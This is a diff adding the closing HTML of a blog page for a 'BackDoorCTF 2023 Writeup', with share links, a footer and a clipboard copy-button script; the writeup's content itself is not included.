+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&text=BackDoorCTF 2023 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&is_video=false&description=BackDoorCTF 2023 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BackDoorCTF 2023 Writeup&body=Check out this article: http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&title=BackDoorCTF 2023 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&name=BackDoorCTF 2023 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://j4ck4l-24.github.io/2024/05/14/BackDoorCTF23_Web_Writeup/&t=BackDoorCTF 2023 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    حقوق النشر &copy;
+    
+    
+    2024
+    j4ck4l
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
